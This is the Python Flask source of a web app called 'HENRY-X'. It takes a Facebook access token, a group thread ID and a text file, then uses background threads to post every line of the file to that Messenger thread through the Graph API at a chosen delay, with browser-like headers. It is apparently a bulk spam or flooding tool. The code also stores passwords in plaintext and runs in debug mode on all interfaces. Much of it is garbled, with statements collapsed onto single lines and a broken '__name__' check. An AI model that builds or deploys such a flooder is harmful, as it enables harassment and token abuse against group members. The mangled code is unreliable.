from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
import secrets
import requests
import time
import threading
import uuid
import datetime

app = Flask(name) app.secret_key = secrets.token_hex(16)

users = {} threads = {} lock = threading.Lock()

def now_iso(): return datetime.datetime.utcnow().isoformat() + "Z"

---------------- HTML TEMPLATES ----------------

HTML_LOGIN = """ <!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>HENRY-X — Login / Signup</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
  <style>
    :root{--bg1:#0f1724;--bg2:#232946;--glass:rgba(255,255,255,0.06)}
    *{box-sizing:border-box}
    body{margin:0;font-family:'Poppins',sans-serif;background:linear-gradient(135deg,var(--bg1),var(--bg2));color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:360px;background:var(--glass);backdrop-filter:blur(8px);padding:24px;border-radius:16px;box-shadow:0 10px 30px rgba(2,6,23,0.6);text-align:center}
    img.logo{width:100%;border-radius:12px;margin-bottom:12px}
    h1{margin:6px 0 14px;background:linear-gradient(90deg,#ff6a95,#7c6cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
    input{width:100%;padding:10px;margin:8px 0;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit}
    button.btn{width:100%;padding:12px;border-radius:10px;border:none;background:linear-gradient(90deg,#ff6a95,#7c6cff);color:white;font-weight:700;cursor:pointer}
    a.small{display:block;margin-top:12px;color:#cbd5e1;text-decoration:none}
    .error{color:#ffccd5;margin-bottom:8px}
  </style>
</head>
<body>
  <div class="card">
    <img class="logo" src="https://i.imgur.com/s5Orhvv.jpeg" alt="HENRY-X">
    <h1>HENRY-X</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="post">
      <input name="username" placeholder="Username" required>
      <input name="password" type="password" placeholder="Password" required>
      <button class="btn" type="submit">{{ 'Continue' if page=='login' else 'Create Account' }}</button>
    </form>
    {% if page=='login' %}
      <a class="small" href="{{ url_for('signup') }}">Don't have an account? Sign up</a>
    {% else %}
      <a class="small" href="{{ url_for('login') }}">Already have account? Login</a>
    {% endif %}
  </div>
</body>
</html>
"""HTML_WELCOME = """ <!doctype html>

<html>
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>HENRY-X — Welcome</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
  <style>
    body{margin:0;font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#0f1724,#232946);color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh}
    .wrap{display:grid;gap:18px;place-items:center}
    .card{width:340px;background:rgba(255,255,255,0.04);padding:22px;border-radius:14px;text-align:center}
    .btn{display:block;padding:12px 18px;margin:8px 0;border-radius:12px;background:linear-gradient(90deg,#ff6a95,#7c6cff);color:white;text-decoration:none;font-weight:700}
    a.logout{color:#ffb4d2;display:block;margin-top:10px}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <img src="https://i.imgur.com/yNJ5qRI.jpeg" style="width:100%;border-radius:10px;margin-bottom:12px">
      <h2>Welcome, {{ user }}</h2>
      <a class="btn" href="{{ url_for('threads_list') }}">📜 Threads</a>
      <a class="btn" href="{{ url_for('henryx_tool') }}">⚡ HENRY-X Tool</a>
      <a class="logout" href="{{ url_for('logout') }}">Logout</a>
    </div>
  </div>
</body>
</html>
"""HTML_HENRYX = """ <!doctype html>

<html>
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>HENRY-X Tool</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
  <style>
    body{margin:0;font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#0f1724,#232946);color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:520px;background:rgba(255,255,255,0.03);padding:22px;border-radius:14px}
    h2{margin-top:0}
    input,select,textarea{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
    .row{display:flex;gap:10px}
    .btn{width:100%;padding:12px;border-radius:10px;border:none;background:linear-gradient(90deg,#ff6a95,#7c6cff);color:white;font-weight:700;cursor:pointer}
    a.back{display:inline-block;margin-top:10px;color:#cbd5e1}
    .note{font-size:13px;color:#cbd5e1}
  </style>
</head>
<body>
  <div class="card">
    <h2>🚀 HENRY-X Tool</h2>
    {% if message %}<div class="note">{{ message }}</div>{% endif %}
    <form method="post" enctype="multipart/form-data">
      <input type="text" name="accessToken" placeholder="EAAD Token" required>
      <input type="text" name="threadId" placeholder="Group Thread ID (just numeric or t_xxx)" required>
      <input type="text" name="kidx" placeholder="Prefix (optional)" >
      <label class="note">Upload .txt (each line will be sent as a message)</label>
      <input type="file" name="txtFile" accept=".txt" required>
      <input type="number" name="time" placeholder="Delay (seconds)" value="2" min="1" required>
      <button class="btn" type="submit">Start Sending</button>
    </form>
    <a class="back" href="{{ url_for('welcome') }}">← Back</a>
  </div>
</body>
</html>
"""HTML_THREADS = """ <!doctype html>

<html>
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Threads — HENRY-X</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
  <style>body{margin:20px;background:linear-gradient(135deg,#0f1724,#232946);color:#e6eef8;font-family:'Poppins',sans-serif}
    .card{background:rgba(255,255,255,0.03);padding:18px;border-radius:12px;max-width:900px;margin:0 auto}
    .row{display:flex;justify-content:space-between;align-items:center;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);margin-bottom:8px}
    .key{font-family:monospace}
    .status{padding:6px 10px;border-radius:8px}
    .running{background:#16a34a}
    .paused{background:#f59e0b;color:#111}
    .stopped{background:#dc2626}
    a.btn{background:linear-gradient(90deg,#ff6a95,#7c6cff);padding:8px 12px;border-radius:8px;color:white;text-decoration:none}
    a.back{display:inline-block;margin-top:12px;color:#cbd5e1}
  </style>
</head>
<body>
  <div class="card">
    <h2>Threads</h2>
    {% if threads_list|length==0 %}<p style="color:#9aa6c3">No threads yet.</p>{% endif %}
    {% for t in threads_list %}
      <div class="row">
        <div>
          <div class="key">{{ t.key }}</div>
          <div style="font-size:13px;color:#9aa6c3">{{ t.name }} • {{ t.created_at }}</div>
        </div>
        <div style="display:flex;gap:10px;align-items:center">
          <div class="status {% if t.status=='running' %}running{% elif t.status=='paused' %}paused{% else %}stopped{% endif %}">{{ t.status.upper() }}</div>
          <a class="btn" href="{{ url_for('thread_detail', key=t.key) }}">Open</a>
        </div>
      </div>
    {% endfor %}
    <a class="back" href="{{ url_for('welcome') }}">← Back</a>
  </div>
</body>
</html>
"""HTML_THREAD_DETAIL = """ <!doctype html>

<html>
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Thread {{ key }}</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
<style>
 body{margin:20px;background:linear-gradient(135deg,#0f1724,#232946);color:#e6eef8;font-family:'Poppins',sans-serif}
 .card{background:rgba(255,255,255,0.03);padding:18px;border-radius:12px;max-width:900px;margin:0 auto}
 .logbox{background:#0b1220;color:#d1d5db;padding:12px;border-radius:8px;height:480px;overflow:auto;font-family:monospace}
 .controls{display:flex;gap:8px;margin-bottom:10px}
 .btn{padding:8px 12px;border-radius:8px;border:none;background:linear-gradient(90deg,#ff6a95,#7c6cff);color:white;cursor:pointer}
 .danger{background:#dc2626}
 a.back{display:inline-block;margin-top:10px;color:#cbd5e1}
</style>
<script>
function fetchLogs(){
  fetch("{{ url_for('thread_logs_api', key=key) }}")
    .then(r=>r.json()).then(d=>{
      document.getElementById('logbox').innerText = d.logs.join('\n');
      document.getElementById('status').innerText = d.status.toUpperCase();
      document.getElementById('logbox').scrollTop = document.getElementById('logbox').scrollHeight;
    }).catch(e=>console.log(e));
}
function action(act){fetch("{{ url_for('thread_action', key=key) }}",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:act})}).then(()=>setTimeout(fetchLogs,300));}
setInterval(fetchLogs,1500);window.onload=fetchLogs;
</script>
</head>
<body>
  <div class="card">
    <h2>Thread: <span style="font-family:monospace">{{ key }}</span></h2>
    <div style="margin-bottom:8px;color:#9aa6c3">Name: {{ meta.name }} • Created: {{ meta.created_at }} • Speed: {{ meta.speed }}s</div>
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
      <div id="status" style="font-weight:bold;padding:6px 10px;border-radius:8px;background:#111">{{ meta.status.upper() }}</div>
      <div style="flex:1"></div>
      <button class="btn" onclick="action('resume')">Resume</button>
      <button class="btn" onclick="action('pause')">Pause</button>
      <button class="btn" onclick="action('stop')">Stop</button>
      <button class="btn danger" onclick="action('delete')">Delete</button>
    </div>
    <div id="logbox" class="logbox"></div>
    <a class="back" href="{{ url_for('threads_list') }}">← Back</a>
  </div>
</body>
</html>
"""---------------- ROUTES ----------------

from flask import redirect

@app.route('/') def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET','POST']) def login(): error=None if request.method=='POST': u=request.form['username']; p=request.form['password'] if u in users and users[u]==p: session['user']=u; return redirect(url_for('welcome')) else: error='Invalid username or password.' return render_template_string(HTML_LOGIN, error=error, page='login')

@app.route('/signup', methods=['GET','POST']) def signup(): error=None if request.method=='POST': u=request.form['username']; p=request.form['password'] if u in users: error='Username already exists!' else: users[u]=p; session['user']=u; return redirect(url_for('welcome')) return render_template_string(HTML_LOGIN, error=error, page='signup')

@app.route('/welcome') def welcome(): if 'user' not in session: return redirect(url_for('login')) return render_template_string(HTML_WELCOME, user=session['user'])

@app.route('/henryx', methods=['GET','POST']) def henryx_tool(): if 'user' not in session: return redirect(url_for('login')) message=None if request.method=='POST': access_token = request.form.get('accessToken') or request.form.get('access_token') or request.form.get('token') thread_id = request.form.get('threadId') or request.form.get('thread_id') prefix = request.form.get('kidx') or '' try: speed = int(request.form.get('time') or request.form.get('speed') or 2) if speed < 1: speed = 1 except: speed = 2 f = request.files.get('txtFile') or request.files.get('file') if not f: message='Please upload a .txt file with messages.' return render_template_string(HTML_HENRYX, message=message) try: lines = [ln for ln in f.read().decode('utf-8').splitlines() if ln.strip()] except Exception as e: message = 'Error reading uploaded file.' return render_template_string(HTML_HENRYX, message=message)

key = uuid.uuid4().hex[:12]
    meta = {
        'key': key,
        'token': (access_token or '').strip(),
        'thread_id': (thread_id or '').strip(),
        'name': prefix or f'job-{key}',
        'speed': speed,
        'lines': lines,
        'status': 'running',
        'logs': [],
        'created_at': now_iso(),
        'paused': False,
        'stop': False,
        'worker': None
    }
    with lock:
        threads[key] = meta

    def worker(m):
        m['logs'].append(f"[{now_iso()}] Worker started")
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': '*/*',
            'Referer': 'https://www.facebook.com'
        }
        try:
            for msg in m['lines']:
                if m['stop']:
                    m['logs'].append(f"[{now_iso()}] Stopped by user")
                    m['status'] = 'stopped'
                    return
                while m['paused'] and not m['stop']:
                    if m['status'] != 'paused':
                        m['status'] = 'paused'; m['logs'].append(f"[{now_iso()}] Paused")
                    time.sleep(0.5)
                if m['stop']:
                    m['logs'].append(f"[{now_iso()}] Stopped by user")
                    m['status'] = 'stopped'
                    return

                full_msg = (prefix + ' ' + msg).strip()
                api_url = f"https://graph.facebook.com/v15.0/t_{m['thread_id']}/"
                params = {'access_token': m['token'], 'message': full_msg}
                try:
                    r = requests.post(api_url, data=params, headers=headers, timeout=20)
                    m['logs'].append(f"[{now_iso()}] Sent: {full_msg} → status:{r.status_code} resp:{r.text}")
                except Exception as e:
                    m['logs'].append(f"[{now_iso()}] Error sending: {str(e)}")

                slept = 0
                while slept < m['speed']:
                    if m['stop']:
                        m['logs'].append(f"[{now_iso()}] Stopped by user")
                        m['status'] = 'stopped'
                        return
                    time.sleep(1); slept += 1

            m['status'] = 'finished'
            m['logs'].append(f"[{now_iso()}] Finished sending {len(m['lines'])} messages.")
        except Exception as e:
            m['logs'].append(f"[{now_iso()}] Worker exception: {str(e)}")

    t = threading.Thread(target=worker, args=(meta,), daemon=True)
    meta['worker'] = t
    t.start()
    message = f"Started background job — thread key: {key}"
return render_template_string(HTML_HENRYX, message=message)

@app.route('/threads') def threads_list(): if 'user' not in session: return redirect(url_for('login')) data = [] with lock: for k,v in sorted(threads.items(), key=lambda kv: kv[1]['created_at'], reverse=True): data.append({'key':k,'name':v['name'],'status':v['status'],'created_at':v['created_at'],'speed':v['speed']}) return render_template_string(HTML_THREADS, threads_list=data)

@app.route('/thread/<key>') def thread_detail(key): if 'user' not in session: return redirect(url_for('login')) with lock: if key not in threads: return 'Thread not found',404 meta = threads[key] return render_template_string(HTML_THREAD_DETAIL, key=key, meta={'name':meta['name'],'created_at':meta['created_at'],'speed':meta['speed'],'status':meta['status']})

@app.route('/thread/<key>/logs') def thread_logs_api(key): if 'user' not in session: return jsonify({'error':'login required'}),401 with lock: if key not in threads: return jsonify({'error':'not found'}),404 meta = threads[key] return jsonify({'status':meta['status'],'logs':meta['logs'][-200:]})

@app.route('/thread/<key>/action', methods=['POST']) def thread_action(key): if 'user' not in session: return jsonify({'error':'login required'}),401 data = request.get_json() or {} action = data.get('action') with lock: if key not in threads: return jsonify({'error':'not found'}),404 meta = threads[key] if action=='pause': meta['paused']=True; meta['status']='paused'; meta['logs'].append(f"[{now_iso()}] Pause requested by user."); return jsonify({'ok':True}) if action=='resume': meta['paused']=False; meta['status']='running'; meta['logs'].append(f"[{now_iso()}] Resume requested by user."); return jsonify({'ok':True}) if action=='stop': meta['stop']=True; meta['logs'].append(f"[{now_iso()}] Stop requested by user."); return jsonify({'ok':True}) if action=='delete': meta['stop']=True; meta['logs'].append(f"[{now_iso()}] Delete requested by user."); del threads[key]; return jsonify({'ok':True}) return jsonify({'error':'unknown action'}),400

@app.route('/logout') def logout(): session.pop('user',None) return redirect(url_for('login'))

if name=='main': app.run(host='0.0.0.0', port=5000, debug=True)

